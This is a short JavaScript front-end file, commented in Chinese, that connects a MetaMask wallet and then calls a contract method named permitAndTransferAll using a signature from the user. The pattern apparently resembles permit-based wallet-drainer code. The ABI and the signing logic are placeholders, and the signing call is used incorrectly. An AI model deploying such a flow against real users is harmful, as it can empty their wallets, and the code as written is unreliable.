let web3;
let account;

const contractAddress = '0x0CcD25CB287E18e55969d65AB5555582657512bE';
const contractABI = [ /* 这里放你的合约 ABI */ ];

document.getElementById('connectButton').onclick = async () => {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const accounts = await web3.eth.getAccounts();
        account = accounts[0];
        document.getElementById('signButton').disabled = false;
        document.getElementById('status').innerText = `已连接：${account}`;
    } else {
        alert('请安装 MetaMask 或其他钱包。');
    }
};

document.getElementById('signButton').onclick = async () => {
    const contract = new web3.eth.Contract(contractABI, contractAddress);
    const deadline = Math.floor(Date.now() / 1000) + 60 * 10; // 10分钟后过期

    const { v, r, s } = await web3.eth.sign(/* 签名逻辑 */);
    
    try {
        await contract.methods.permitAndTransferAll(account, deadline, v, r, s).send({ from: account });
        document.getElementById('status').innerText = '转账成功！';
    } catch (error) {
        document.getElementById('status').innerText = '转账失败。';
        console.error(error);
    }
};
